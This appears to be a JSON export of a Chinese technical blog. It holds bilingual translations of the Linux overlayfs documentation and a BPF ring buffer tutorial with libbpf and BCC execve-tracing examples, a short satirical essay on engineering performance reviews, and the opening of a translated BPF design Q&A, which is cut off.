值可能不是持久的，即使在Overlay文件系统还处于挂载状态时也可能会发生变化，如上面的 Inode 属性表中总结的那样。\n修改底层文件系统（Changes to underlying filesystems） Changes to the underlying filesystems while part of a mounted overlay filesystem are not allowed. If the underlying filesystem is changed, the behavior of the overlay is undefined, though it will not result in a crash or deadlock.\nOffline changes, when the overlay is not mounted, are allowed to the upper tree. Offline changes to the lower tree are only allowed if the \u0026quot;metadata only copy up\u0026quot;, \u0026quot;inode index\u0026quot;, \u0026quot;xino\u0026quot; and \u0026quot;redirect_dir\u0026quot; features have not been used. If the lower tree is modified and any of these features has been used, the behavior of the overlay is undefined, though it will not result in a crash or deadlock.\n不允许修改已挂载的Overlay文件系统的底层文件系统。 如果底层文件系统发生更改，则overlay fs的行为是未定义的，尽管它不会导致崩溃或死锁。\n当未挂载overlay fs时，允许对上层树进行离线更改。 仅当未使用“仅向上复制元数据”、“inode 索引”、“xino”和“redirect_dir”功能时，才允许对下部树进行离线更改。 如果修改了较低的树并且使用了任何这些功能，则overlay的行为是未定义的，尽管它不会导致崩溃或死锁。\nWhen the overlay NFS export feature is enabled, overlay filesystems behavior on offline changes of the underlying lower layer is different than the behavior when NFS export is disabled.\nOn every copy_up, an NFS file handle of the lower inode, along with the UUID of the lower filesystem, are encoded and stored in an extended attribute \u0026quot;trusted.overlay.origin\u0026quot; on the upper inode.\nWhen the NFS export feature is enabled, a lookup of a merged directory, that found a lower directory at the lookup path or at the path pointed to by the \u0026quot;trusted.overlay.redirect\u0026quot; extended attribute, will verify that the found lower directory file handle and lower filesystem UUID match the origin file handle that was stored at copy_up time. If a found lower directory does not match the stored origin, that directory will not be merged with the upper directory.\n当启用overlay NFS 导出功能时，overlay文件系统对底层较低层的离线更改的行为与禁用 NFS 导出时的行为不同。\n每次的向上拷贝（copy_up），下层 inode 的 NFS 文件句柄以及下层文件系统的 UUID 都被编码并存储在上层 inode 上的扩展属性“trusted.overlay.origin”中。\n当启用 NFS 导出功能时，一次对合并目录的查找，如果通过路径找到下层目录，或通过“trusted.overlay.redirect”扩展属性指向的路径找到下层目录，将验证找到的下层目录文件句柄和下层文件系统 UUID 是否与 copy_up 时存储的原始文件句柄匹配。 如果找到的下级目录与存储的源不匹配，则该目录将不会与上级目录合并。\nNFS导出（NFS export） When the underlying filesystems supports NFS export and the \u0026quot;nfs_export\u0026quot; feature is enabled, an overlay filesystem may be exported to NFS.\nWith the \u0026quot;nfs_export\u0026quot; feature, on copy_up of any lower object, an index entry is created under the index directory. The index entry name is the hexadecimal representation of the copy up origin file handle. For a non-directory object, the index entry is a hard link to the upper inode. For a directory object, the index entry has an extended attribute \u0026quot;trusted.overlay.upper\u0026quot; with an encoded file handle of the upper directory inode.\nWhen encoding a file handle from an overlay filesystem object, the following rules apply:\nFor a non-upper object, encode a lower file handle from lower inode For an indexed object, encode a lower file handle from copy_up origin For a pure-upper object and for an existing non-indexed upper object, encode an upper file handle from upper inode 当底层文件系统支持 NFS 导出并且启用“nfs_export”功能时，可以将overlay文件系统导出到 NFS。\n使用“nfs_export”功能，在复制任何下层对象时，会在索引目录下创建索引条目。 索引条目名称是复制源文件句柄的十六进制表示形式。 对于非目录对象，索引项是到上层 inode 的硬链接。 对于目录对象，索引条目具有扩展属性“trusted.overlay.upper”，其中包含上层目录 inode 的编码文件句柄。\n当从overlay文件系统对象编码文件句柄时，适用以下规则：\n对于非上层对象，从下层inode编码出下层文件句柄 对于索引对象，从 copy_up 源编码下层文件句柄 对于纯上层对象和现有的非索引上层对象，从上层 inode 编码上层文件句柄 The encoded overlay file handle includes:\nHeader including path type information (e.g. lower/upper) UUID of the underlying filesystem Underlying filesystem encoding of underlying inode This encoding format is identical to the encoding format file handles that are stored in extended attribute \u0026quot;trusted.overlay.origin\u0026quot;.\n编码的overlay文件句柄包括：\n包含路径类型信息的标头（例如下层/上层） 下层文件系统的UUID 下层 inode 的底层文件系统编码 此编码格式与存储在扩展属性“trusted.overlay.origin”中的文件句柄编码格式相同。\nWhen decoding an overlay file handle, the following steps are followed:\nFind underlying layer by UUID and path type information. Decode the underlying filesystem file handle to underlying dentry. For a lower file handle, lookup the handle in index directory by name. If a whiteout is found in index, return ESTALE. This represents an overlay object that was deleted after its file handle was encoded. For a non-directory, instantiate a disconnected overlay dentry from the decoded underlying dentry, the path type and index inode, if found. For a directory, use the connected underlying decoded dentry, path type and index, to lookup a connected overlay dentry. 解码overlay文件句柄时，遵循以下步骤：\n通过UUID和路径类型信息找到下层。 将下层文件系统文件句柄解码为下层dentry（目录项）。 对于下层文件句柄，在索引目录中按名称查找该句柄。 如果在索引中发现whiteout，则返回 ESTALE。 这代表其文件句柄编码后overlay对象被删除。 对于非目录，从解码的底层目录项、路径类型和索引 inode实例化断开连接的overlay dentry（如果找到）。 对于目录，使用连接的底层解码目录项、路径类型和索引来查找连接的overlay dentry。 Decoding a non-directory file handle may return a disconnected dentry. copy_up of that disconnected dentry will create an upper index entry with no upper alias.\nWhen overlay filesystem has multiple lower layers, a middle layer directory may have a \u0026quot;redirect\u0026quot; to lower directory. Because middle layer \u0026quot;redirects\u0026quot; are not indexed, a lower file handle that was encoded from the \u0026quot;redirect\u0026quot; origin directory, cannot be used to find the middle or upper layer directory. Similarly, a lower file handle that was encoded from a descendant of the \u0026quot;redirect\u0026quot; origin directory, cannot be used to reconstruct a connected overlay path. To mitigate the cases of directories that cannot be decoded from a lower file handle, these directories are copied up on encode and encoded as an upper file handle. On an overlay filesystem with no upper layer this mitigation cannot be used NFS export in this setup requires turning off redirect follow (e.g. \u0026quot;redirect_dir=nofollow\u0026quot;).\n解码非目录文件句柄可能会返回断开连接的目录项。 该断开连接的 dentry 的 copy_up 将创建一个没有上层别名的上层索引条目。\n当overlay文件系统具有多个下层时，中间层目录可能会“重定向”到下层目录。 因为中间层“重定向”没有索引，所以从“重定向”原始目录编码的较低文件句柄不能用于查找中间层或上层目录。 类似地，从“重定向”原始目录的后代编码的较低文件句柄不能用于重建连接的overlay路径。 为了缓解无法从较低文件句柄解码目录的情况，这些目录在编码时被复制并编码为较高层文件句柄。 在没有上层的覆盖文件系统上，无法使用此缓解措施。此设置中的 NFS 导出需要关闭重定向跟踪（例如“redirect_dir=nofollow”）。\nThe overlay filesystem does not support non-directory connectable file handles, so exporting with the 'subtree_check' exportfs configuration will cause failures to lookup files over NFS.\nWhen the NFS export feature is enabled, all directory index entries are verified on mount time to check that upper file handles are not stale. This verification may cause significant overhead in some cases.\nNote: the mount options index=off,nfs_export=on are conflicting for a read-write mount and will result in an error.\nNote: the mount option uuid=off can be used to replace UUID of the underlying filesystem in file handles with null, and effectively disable UUID checks. This can be useful in case the underlying disk is copied and the UUID of this copy is changed. This is only applicable if all lower/upper/work directories are on the same filesystem, otherwise it will fallback to normal behaviour.\n覆盖文件系统不支持非目录可连接文件句柄，因此使用“subtree_check”exportfs 配置导出将导致通过 NFS 查找文件失败。\n启用 NFS 导出功能后，所有目录索引条目都会在挂载时进行验证，以检查上层文件句柄是否已过时。 在某些情况下，此验证可能会导致显著的开销。\n注意：挂载选项index=off,nfs_export=on对于读写挂载是冲突的，并且会导致错误。\n注意：挂载选项 uuid=off 可用于将文件句柄中底层文件系统的 UUID 替换为 null，并有效禁用 UUID 检查。 如果复制了下层磁盘并且该副本的 UUID 发生了更改，这会很有用。 仅当所有下层/上层/工作目录位于同一文件系统上时才适用，否则它将恢复正常行为。\n易失性挂载（Volatile mount） This is enabled with the \u0026quot;volatile\u0026quot; mount option. Volatile mounts are not guaranteed to survive a crash. It is strongly recommended that volatile mounts are only used if data written to the overlay can be recreated without significant effort.\nThe advantage of mounting with the \u0026quot;volatile\u0026quot; option is that all forms of sync calls to the upper filesystem are omitted.\n这是通过“易失性”挂载选项启用的。无法保证易失性挂载能够在崩溃中幸存下来。 强烈建议仅当无需付出很大努力即可重新创建写入overlay fs的数据时，才使用易失性挂载。\n使用“易失性”选项挂载的优点是省略了对上层文件系统的所有形式的sync调用。\nIn order to avoid a giving a false sense of safety, the syncfs (and fsync) semantics of volatile mounts are slightly different than that of the rest of VFS. If any writeback error occurs on the upperdir's filesystem after a volatile mount takes place, all sync functions will return an error. Once this condition is reached, the filesystem will not recover, and every subsequent sync call will return an error, even if the upperdir has not experience a new error since the last sync call.\nWhen overlay is mounted with \u0026quot;volatile\u0026quot; option, the directory \u0026quot;$workdir/work/incompat/volatile\u0026quot; is created. During next mount, overlay checks for this directory and refuses to mount if present. This is a strong indicator that user should throw away upper and work directories and create fresh one. In very limited cases where the user knows that the system has not crashed and contents of upperdir are intact, The \u0026quot;volatile\u0026quot; directory can be removed.\n为了避免给人一种错误的安全感，易失性挂载的syncfs（和fsync）语义与VFS其余部分的语义略有不同。 如果在易失性挂载上层目录的文件系统上发生任何回写错误，则所有sync函数都将返回错误。 一旦达到此条件，文件系统将无法恢复，并且每个后续sync调用都将返回错误，即使上层目录自上次sync调用以来没有遇到新错误也是如此。\n当使用“易失性”选项挂载overlay时，将创建目录“$workdir/work/incompat/volatile”。 在下次挂载时，overlay检查此目录并拒绝挂载（如果存在）。 这是一个强有力的指标，表明用户应该丢弃上层目录和工作目录并创建新的目录。 在非常有限的情况下，用户知道系统没有崩溃并且上层目录的内容完好无损，可以删除“volatile”目录。\n用户扩展属性（User xattr） The \u0026quot;-o userxattr\u0026quot; mount option forces overlayfs to use the \u0026quot;user.overlay.\u0026quot; xattr namespace instead of \u0026quot;trusted.overlay.\u0026quot;. This is useful for unprivileged mounting of overlayfs.\n“-o userxattr”挂载选项强制overlayfs使用“user.overlay.” xattr 命名空间而不是“trusted.overlay.”。 这对于非特权挂载overlayfs 很有用。\n测试套（Testsuite） There's a testsuite originally developed by David Howells and currently maintained by Amir Goldstein at:\n有一个测试套件最初由 David Howells 开发，目前由 Amir Goldstein 维护，网址为：\nhttps://github.com/amir73il/unionmount-testsuite.git\nRun as root:\n以Root用户运行：\n1# cd unionmount-testsuite 2# ./run --ov --verify ","link":"https://weizhang555.github.io/translate/linux-overlayfs/","section":"translate","tags":["内核"],"title":"[内核文档翻译] Overlay文件系统"},{"body":"","link":"https://weizhang555.github.io/categories/","section":"categories","tags":null,"title":"Categories"},{"body":"","link":"https://weizhang555.github.io/tags/","section":"tags","tags":null,"title":"Tags"},{"body":"","link":"https://weizhang555.github.io/translate/","section":"translate","tags":null,"title":"Translates"},{"body":"","link":"https://weizhang555.github.io/","section":"","tags":null,"title":"WeiZhang555"},{"body":"","link":"https://weizhang555.github.io/tags/%E5%86%85%E6%A0%B8/","section":"tags","tags":null,"title":"内核"},{"body":"","link":"https://weizhang555.github.io/categories/%E8%AF%91%E6%96%87/","section":"categories","tags":null,"title":"译文"},{"body":"1. 古代版 暖曰：“王独不闻魏文王之问扁鹊耶？\n曰：‘子昆弟三人其孰最善为医？’\n扁鹊曰：‘长兄最善，中兄次之，扁鹊最为下。’\n魏文侯曰：‘可得闻邪？’\n扁鹊曰：‘长兄于病视神，未有形而除之，故名不出于家。中兄治病，其在毫毛，故名不出于闾。\n若扁鹊者，镵血脉，投毒药，副肌肤，闲而名出闻于诸侯。’\n-- 《鹖冠子·世贤第十六》\n2. 现代版 王问：“你们兄弟三人谁的代码写的最好？”\n小明答：“大哥写的最好，二哥其次，我写的最差”。\n王问：“可是为什么你的绩效最好呢？”\n小明答：“大哥写代码都是一蹴而就，写的又快又好，跑十年都不出一个故障，写完了就喝茶聊天，因而领导觉得他工作量不饱和不给好绩效，所以只有我们圈子里的人知道他厉害；\n二哥写代码也写的很好，虽然bug多，但测试同学提出bug很快就修好，不会遗留到线上，因而绩效马马虎虎；\n我写的最差，上线了还时不时出故障，但是我天天熬夜写代码，加班修复线上问题，懂得拉会议，能摇人。客户说我活儿好态度好，领导说我善于协调同时团队协作能力强，因而我绩效最好”\n3. 评 防火不如救火，治未病不如治已病，好代码不如好吆喝。\n不知道从何评起，只有一点感悟和一声叹息，与君共勉。\n","link":"https://weizhang555.github.io/translate/whats-good-engineer/","section":"translate","tags":["随笔"],"title":"防火不如救火，治未病不如治已病，好代码不如好吆喝"},{"body":"","link":"https://weizhang555.github.io/tags/%E9%9A%8F%E7%AC%94/","section":"tags","tags":null,"title":"随笔"},{"body":"","link":"https://weizhang555.github.io/tags/bpf/","section":"tags","tags":null,"title":"bpf"},{"body":"本文介绍如何使用BPF ring buffer，原文来自这里。\n在学习ring buffer的使用时，我翻阅了很多文档，筛选过后发现这篇文章是很不错的学习材料，即便它最后一次更新停留在2021年3月，内容也依旧可靠。\n以下为正文。\nUpdate March 30th, 2021: This article is still relevant if you are looking for a practical example on how to use the BPF Ring Buffer. If you want a deep explaination on how it works I suggest to visit the blog of the main author of this feature Andrii here. Enjoy the learning! :)\n2021 年 3 月 30 日更新：如果您正在寻找有关如何使用 BPF 环形缓冲区的实际示例，本文仍然具有相关性。 如果您想深入了解其工作原理，我建议访问此功能主要作者 Andrii 的博客。 享受学习的乐趣吧！ :)\n介绍 The 5.8 release of the Linux Kernel came out with lots of interesting elements. Yes, as always.\nA couple of weeks ago, while still processing all the news in there, I came accross a patch proposing a new bpf map type called BPF_MAP_TYPE_RINGBUF. By using this new map type we finally have an MPSC (multi producer single consumer) data structure optimized for data buffering and streaming.\nLinux 内核 5.8 版本包含许多有趣的元素。 是的，一如既往。\n几周前，当我仍在处理其中的所有新闻时，我发现了一个补丁，提出了一种名为 BPF_MAP_TYPE_RINGBUF 的新 bpf map类型。 通过使用这种新的map类型，我们最终拥有了针对数据缓冲和流式传输进行优化的 MPSC（多生产者单消费者）数据结构。\nSome exciting things about it:\nThis type of map is not tied to the same CPU when dealing with the output as it is with BPF_MAP_TYPE_PERF_EVENT_ARRAY. This is very important for me and I’m already experimenting with this in the Falco BPF driver. It’s very flexible in letting the user to decide what kind of memory allocation model they want to use by reserving beforehand or not. It is observable using bpf_ringbuf_query by replying to various queries about its state. This could be useful to feed a prometheus exporter to monitor the health of the buffer. Producers do not block each other, even on different CPUs Spinlock is used internally to do the locking on reservations that are also ordered, while commits are completely lock free. This is very cool, because locking comes for free, no need to use bpf_spin_lock around or having to manage it. 一些令人兴奋的事情：\n这种类型的map在处理输出时与 BPF_MAP_TYPE_PERF_EVENT_ARRAY 不同，它不绑定同一个CPU。 这对我来说非常重要，我已经在 Falco BPF 驱动程序中进行了试验。 它非常灵活，可以让用户通过“预留”或“不预留”来决定使用哪种内存分配模型。 可以使用 bpf_ringbuf_query 通过回复的有关其状态的各种查询来观察它。 这对于为普罗米修斯导出器提供数据以监控缓冲区的运行健康状况可能很有用。 生产者不会互相阻塞，即使在不同的CPU上 自旋锁在内部用于对预留进行锁定，预留同样是有序的，而提交是完全无锁的。 这非常酷，因为锁定是免费的，无需使用 bpf_spin_lock或不得不管理它。 The patch author did a very good job at explaining all the reasons why the change was needed, so I will not go that way with this post. Instead, I want to write about to actually make use of this new feature.\n补丁作者很好地解释了需要进行更改的所有原因，因此我不会在这篇文章中继续阐述这些。 相反，我想写一篇关于实际使用这个新功能的文章。\n写这篇文章的动机 Finding good resources on new BPF features is very hard. The subsystem maintainers team is doing a ginormous work at it and documenting every single bit is very difficult.\nMoreover, this new feature is just another map interface so essentially can be used as the others do. However, I felt like others could benefit from my researching about this new features so i did put together this writeup while I was experimenting on it.\n寻找有关 BPF 新功能的优质文档非常困难。 子系统维护团队正在做大量的工作，记录每一个细节是非常困难的。\n此外，这个新功能只是另一个map接口，因此本质上可以像其他功能一样使用。 然而，我觉得其他人可以从我对这个新功能的研究中受益，所以我在试验时整理了这篇文章。\n关于helpers的注意事项 For every functionality it exposes, the BPF subsystem exposes an helper.\nThe helper is used to let you interact with that specific part of the subsystem that does the feature you are invoking.\n对于它暴露的每个功能，BPF 子系统都会公开一个helper程序。\nhelper用于让您与正在调用的功能的子系统的特定部分进行交互。\nThe purpose of the Linux Kernel is not to give you the helper definitions or a library so your system will normally not ship with an header that you can import to get your hands into the functions definitions for the helper.\nThe idea is that you will write the definitions yourself when you want to use a specific helper, e.g:\nLinux 内核的目的不是为您提供helper程序定义或库，因此您的系统通常不会附带可导入的header文件，以便了解helper程序的函数定义。\n所以当您想使用特定的helper时，您将不得不自己编写定义，例如：\n1static void *(*bpf_ringbuf_reserve)(void *ringbuf, __u64 size, __u64 flags) = 2 (void *)BPF_FUNC_ringbuf_reserve; The patch adds 5 new BPF helpers\n这个补丁增加了5个新的BPF helper程序\n1void *bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags); 2void *bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags); 3void bpf_ringbuf_submit(void *data, u64 flags); 4void bpf_ringbuf_discard(void *data, u64 flags); 5u64 bpf_ringbuf_query(void *ringbuf, u64 flags); You can look at a complete list of all the BPF helpers at bpf-helpers(7).\nWith these premises, and to keep things simple I decided to show two different usage examples of the new features using libbpf and BCC.\nIt would be impractical for me to show you how to use the functionalities in a raw way by defining ourselves all the needed helpers definitions for the BPF functionalities we use.\nA very good explaination about BPF helpers can be found at ebpf.io.\n您可以在 bpf-helpers(7) 查看所有 BPF 助手的完整列表。\n有了这些前提，并且为了简单起见，我决定使用 libbpf 和 BCC 来展示新功能的两个不同使用示例。\n对我来说，通过为我们使用的 BPF 功能定义所有所需的helper定义，来向您展示如何以原始方式使用这些功能是不切实际的。\n关于 BPF 助手的完整的解释可以在 ebpf.io 找到。\n使用 libbpf Fortunately, the kernel provides a complete API that does all the work of exporting the helpers for us.\nIf you look around for libbpf, it has two homes:\nThe original copy, resides in the linux kernel under tools/lib/bpf. The out-of-tree mirror at github.com/libbpf/libbpf. To follow the example here, first go to the libbpf repository and follow the instructions to install it. The ring buffer support was added in v0.0.9. Also, make sure to have a \u0026gt;= 5.8 Kernel.\n幸运的是，内核提供了一个完整的API，可以为我们完成导出helper的所有工作。\n如果你四处寻找 libbpf，它有两个主要地址：\n原始副本驻留在 Linux 内核的 tools/lib/bpf 下。 位于 github.com/libbpf/libbpf 的树外镜像。 要遵循此处的示例，请首先转到 libbpf 代码仓库并按照说明进行安装。 v0.0.9 中添加了环形缓冲区支持。 另外，请确保内核 \u0026gt;= 5.8。\nHere is how the BPF program:\nThe program itself is very simple, we attach to the tracepoint that gets hit every time an execve syscall is done.\nThe interesting part here for BPF_MAP_TYPE_RINGBUF is the initialization of the map with bpf_map_def. This type of map does not want the .key and .value sections and for the .max_entries value the patch says it wants a power of two. That is not entirely right, the value also needs to be page aligned with the current page shift size. In the current asm_generic/page.h here it’s defined as 1 \u0026lt;\u0026lt; 12 so any value multiple of 4096 will be ok.\nBPF 程序如下：\n程序本身非常简单，我们attach到tracepoint上，每次 execve 系统调用完成时会触发。\nBPF_MAP_TYPE_RINGBUF 有趣的部分是使用 bpf_map_def 初始化map。 这种类型的map不需要 .key 和 .value 部分，而对于 .max_entries 值，补丁表明它需要设置为 2 的幂（译者注：2的n次方）。 这并不完全正确，该值还需要与当前页移位大小进行页面对齐。 在当前的 asm_generic/page.h 中，它被定义为 1 \u0026lt;\u0026lt; 12，因此 4096 的任何倍数都可以。\nOnce the map is initialized, look at what we do in our tracepoint, there are two ringbuf specific calls:\nbpf_ringbuf_reserve does the memory reservation for the buffer, this is the only time locking is done bpf_ringbuf_submit does the actual write to the map, this is lock free 一旦map被初始化，看看我们在tracepoint中做了什么，有两个ringbuf特定的调用：\nbpf_ringbuf_reserve 为缓冲区预留内存，这是唯一一次完成锁定 bpf_ringbuf_submit 实际写入map，这是无锁的 （译者注：下面的代码会被折叠，点击左下角的...可以展开，或者右上角的图标）\n1##include \u0026lt;linux/types.h\u0026gt; 2 3##include \u0026lt;bpf/bpf_helpers.h\u0026gt; 4##include \u0026lt;linux/bpf.h\u0026gt; 5 6struct event { 7 __u32 pid; 8 char filename[16]; 9}; 10 11struct bpf_map_def SEC(\u0026#34;maps\u0026#34;) buffer = { 12 .type = BPF_MAP_TYPE_RINGBUF, 13 .max_entries = 4096 * 64, 14}; 15 16struct trace_entry { 17 short unsigned int type; 18 unsigned char flags; 19 unsigned char preempt_count; 20 int pid; 21}; 22 23struct trace_event_raw_sys_enter { 24 struct trace_entry ent; 25 long int id; 26 long unsigned int args[6]; 27 char __data[0]; 28}; 29 30 31SEC(\u0026#34;tracepoint/syscalls/sys_enter_execve\u0026#34;) 32int sys_enter_execve(struct trace_event_raw_sys_enter *ctx) { 33 __u32 pid = bpf_get_current_pid_tgid() \u0026gt;\u0026gt; 32; 34 struct event *event = bpf_ringbuf_reserve(\u0026amp;buffer, sizeof(struct event), 0); 35 if (!event) { 36 return 1; 37 } 38 event-\u0026gt;pid = pid; 39 bpf_probe_read_user_str(event-\u0026gt;filename, sizeof(event-\u0026gt;filename), 40 (const char *)ctx-\u0026gt;args[0]); 41 42 bpf_ringbuf_submit(event, 0); 43 44 return 0; 45} 46 47char _license[] SEC(\u0026#34;license\u0026#34;) = \u0026#34;GPL\u0026#34;; Now save this source in a file called program.c if you want to try it later.\nLoading the program would be impossible without a loader.\nBesides all the boilerplate it does to load the program and the tracepoint, there are some interesting things for the ringbuf usecase here too:\nThe buf_process_sample callback gets called every time a new element is read from the ring buffer The ringbuffer is read using ring_buffer_consume 现在，如果您想稍后尝试，请将此源代码保存在名为 program.c 的文件中。\n如果没有loader程序，就不可能加载程序。\n除了加载程序和tracepoint所需的所有样板之外，ringbuf 用例还有一些有趣的事情：\n每次从环形缓冲区读取新元素时都会调用 buf_process_sample 回调函数 使用ring_buffer_consume读取ringbuffer 1##include \u0026lt;bpf/libbpf.h\u0026gt; 2##include \u0026lt;stdio.h\u0026gt; 3##include \u0026lt;unistd.h\u0026gt; 4 5struct event { 6 __u32 pid; 7 char filename[16]; 8}; 9 10static int buf_process_sample(void *ctx, void *data, size_t len) { 11 struct event *evt = (struct event *)data; 12 printf(\u0026#34;%d %s\\n\u0026#34;, evt-\u0026gt;pid, evt-\u0026gt;filename); 13 14 return 0; 15} 16 17int main(int argc, char *argv[]) { 18 const char *file = \u0026#34;program.o\u0026#34;; 19 struct bpf_object *obj; 20 int prog_fd = -1; 21 int buffer_map_fd = -1; 22 struct bpf_program *prog; 23 24 bpf_prog_load(file, BPF_PROG_TYPE_TRACEPOINT, \u0026amp;obj, \u0026amp;prog_fd); 25 26 buffer_map_fd = bpf_object__find_map_fd_by_name(obj, \u0026#34;buffer\u0026#34;); 27 28 struct ring_buffer *ring_buffer; 29 30 ring_buffer = ring_buffer__new(buffer_map_fd, buf_process_sample, NULL, NULL); 31 32 if(!ring_buffer) { 33 fprintf(stderr, \u0026#34;failed to create ring buffer\\n\u0026#34;); 34 return 1; 35 } 36 37 prog = bpf_object__find_program_by_title(obj, \u0026#34;tracepoint/syscalls/sys_enter_execve\u0026#34;); 38 if (!prog) { 39 fprintf(stderr, \u0026#34;failed to find tracepoint\\n\u0026#34;); 40 return 1; 41 } 42 43 bpf_program__attach_tracepoint(prog, \u0026#34;syscalls\u0026#34;, \u0026#34;sys_enter_execve\u0026#34;); 44 45 while(1) { 46 ring_buffer__consume(ring_buffer); 47 sleep(1); 48 } 49 50 return 0; 51} Now save this source in a file called loader.c if you want to try it later.\nIt required quite some code to just showcase the ringbuf related functions. Sorry for the big wall of code!\nNow we can proceed, compile and run it.\nIn the folder where you saved program.c and loader.c:\nCompile the program:\n现在，如果您想稍后尝试，请将此源代码保存在名为 loader.c 的文件中。\n它需要相当多的代码来展示与ringbuf相关的功能。 抱歉，代码确实很多！\n现在我们可以继续，编译并运行它。\n在保存program.c和loader.c的文件夹中：\n编译程序：\n1clang -O2 -target bpf -g -c program.c ## -g is to generate btf code Compile the loader\n编译loader\n1gcc -g -lbpf loader.c You can now run it via:\n你可以按如下方式运行：\n1sudo ./a.out 2It wil produce something similar to this: 3 4393811 /bin/zsh 5393812 /usr/bin/env 6393812 /usr/local/bin/ 7393812 /usr/local/sbin 8393812 /usr/bin/zsh 9393816 /usr/bin/ls 10393818 /usr/bin/git 11393819 /usr/bin/awk 12393824 /usr/bin/git 13393825 /usr/bin/git 14393826 /usr/bin/git If you followed my suggestion and left the -g flag to the clang command while compiling the program, congrats, you just produced a BPF CO-RE (Compile Once, Run Everywhere) program.\nYes, you can move it to another machine with Kernel 5.8 and it will work. Next step is to compile the loader statically to move it together with the program. This is left to the reader :)\n如果您遵循我的建议，在编译程序时将 -g 标志留给 clang 命令，那么恭喜您，您刚刚生成了一个 BPF CO-RE（一次编译，到处运行）程序。\n是的，您可以将其移动到另一台具有 5.8 内核的计算机上，它也会工作。 下一步是静态编译加载器以将其与程序一起移动过去。 这个就留给读者了:)\n使用 BCC This paragraph is about doing the same thing we did with libbpf but with BCC.\nBCC added the support for the BPF ring buffer almost immediately by adding the helper definitions and by implementing the Python API support.\nTo make this work you will need to be on a kernel \u0026gt;= 5.8 and have at least BCC 0.16.0. If you need to learn how to install BCC they have a very good resource here.\nHere’s the python code, comments below:\n本段的内容与我们使用 libbpf 所做的相同，但使用的是 BCC。\nBCC 通过添加helper定义和实现 Python API 支持，几乎立即添加了对 BPF 环形缓冲区的支持。\n要实现此功能，您需要使用 \u0026gt;= 5.8 的内核，并且至少有 BCC 0.16.0。 如果您需要学习如何安装 BCC，他们这里有非常好的资源。\n这是python代码，注释如下：\n1##!/usr/bin/python3 2 3import sys 4import time 5 6from bcc import BPF 7 8src = r\u0026#34;\u0026#34;\u0026#34; 9BPF_RINGBUF_OUTPUT(buffer, 1 \u0026lt;\u0026lt; 4); 10 11struct event { 12 u32 pid; 13 char filename[16]; 14}; 15 16TRACEPOINT_PROBE(syscalls, sys_enter_execve) { 17 u32 pid = bpf_get_current_pid_tgid() \u0026gt;\u0026gt; 32; 18 struct event *event = buffer.ringbuf_reserve(sizeof(struct event)); 19 if (!event) { 20 return 1; 21 } 22 event-\u0026gt;pid = pid; 23 bpf_probe_read_user_str(event-\u0026gt;filename, sizeof(event-\u0026gt;filename), args-\u0026gt;filename); 24 25 buffer.ringbuf_submit(event, 0); 26 27 return 0; 28} 29\u0026#34;\u0026#34;\u0026#34; 30 31b = BPF(text=src) 32 33def callback(ctx, data, size): 34 event = b[\u0026#39;buffer\u0026#39;].event(data) 35 print(\u0026#34;%-8s %-16s\u0026#34; % (event.pid, event.filename.decode(\u0026#39;utf-8\u0026#39;))) 36 37 38my_rb = b[\u0026#39;buffer\u0026#39;] 39my_rb.open_ring_buffer(callback) 40 41print(\u0026#34;%-8s %-16s\u0026#34; % (\u0026#34;PID\u0026#34;, \u0026#34;FILENAME\u0026#34;)) 42 43try: 44 while 1: 45 b.ring_buffer_poll() 46 time.sleep(0.5) 47except KeyboardInterrupt: 48 sys.exit() As you can see, we are making use of the BCC helper BPF_RINGBUF_OUTPUT to create a ring buffer named events, then on that one we call ringbuf_submit and ringbug_poll to do our read and write operations.\nIf you want to try, copy the program to a program.py file. You will need to execute it with root permissions:\n正如您所看到的，我们正在利用 BCC helper程序 BPF_RINGBUF_OUTPUT 创建一个名为 events 的环形缓冲区，然后在该环形缓冲区上我们调用ringbuf_submit 和ringbug_poll 来执行读取和写入操作。\n如果您想尝试，请将程序复制到program.py 文件中。 您需要使用 root 权限执行它：\n1sudo python program.py The output should be something like:\n输出应该会像这样：\n1PID FILENAME 243674 /bin/zsh 343675 /usr/bin/env 443675 /usr/local/bin/ 543675 /usr/local/sbin 643675 /usr/bin/zsh 743678 /usr/bin/dircol 843679 /usr/bin/ls 943681 /usr/bin/git 1043682 /usr/bin/awk 1143687 /usr/bin/git 1243688 /usr/bin/git 1343689 /usr/bin/git 1443701 /usr/bin/sh 1543701 /usr/bin/git 结论 Once again, as with every release, the BPF subsystem is becoming more and more feature complete. This specific feature is addressing a very felt use case for those (like me) who move a lot of data around using maps.\nThanks to the maintainers and the many contributors for their hard work!\n与每个版本一样，BPF 子系统的功能变得越来越完整。 对于那些使用maps移动大量数据的人（比如我）来说，这个特定功能正在解决一个非常明显的用例。\n感谢维护者和众多贡献者的辛勤工作！\n","link":"https://weizhang555.github.io/translate/using-bpf-ringbuffer/","section":"translate","tags":["bpf","内核"],"title":"使用BPF ring buffer"},{"body":"原文链接：BPF Design Q\u0026amp;A\n声明：\n本文根据截止2023-07-22日的文档最新内容进行翻译，无法保证永远是最新的。 由于作者水平有限，难免出现错误和遗漏，如果发现有错误的内容欢迎在下方评论区留言指正。 这篇文章是以文档的形式介绍了ebpf的设计上的考虑，对于提升ebpf的理解很有好处，这是为什么单独挑选这篇文章进行翻译的原因。\n以下是正文。\n问：BPF是一种类似x86和arm64的通用指令集吗？ 答: NO.\n问：BPF是通用的虚拟机吗？ 答：NO。\nBPF是遵循C语言调用约定(C calling convention)的一种通用指令集。\n问：为什么选择了C语言调用约定？ 答：因为BPF程序是为在Linux kernel内运行而设计的，kernel是用C语言写的，因而BPF定义了与x86和arm64两个最常用的架构兼容的指令集(同时也考虑到了其他架构的一些重要“怪癖”)，也定义了与那些架构上的linux kernel的C调用约定兼容的调用约定。\n问：未来会支持多个返回值吗？ 答：NO。BPF仅支持使用R0寄存器作为函数返回值。\n问：未来会支持超过5个函数参数吗？ 答：NO。BPF 调用约定仅允许寄存器 R1-R5 用作参数。 BPF 不是一个独立的指令集。 （与允许 msft、cdecl 和其他约定的 x64 ISA 不同）\n问：BPF程序可以访问指令指针(instruction pointer)或返回地址吗？ 答：NO\n问：BPF程序可以访问栈指针(stack pointer)吗？ 答：NO。\n只有帧指针(frame pointer)(寄存器R10)可以被访问。从编译器角度看，拥有栈指针是有必要的。例如，LLVM定义了寄存器R11作为BPF后端的栈指针，但是它确保了生成的代码永远不会使用它。\n问：C 调用约定是否会减少可能的用例？ 答：YES。\nBPF的设计强制以内核helper函数和内核对象（像BPF maps）的形式添加主要功能，并且他们之间可以无缝互操作。它允许kernel调用BPF程序，并且BPF程序可以零开销调用kernel 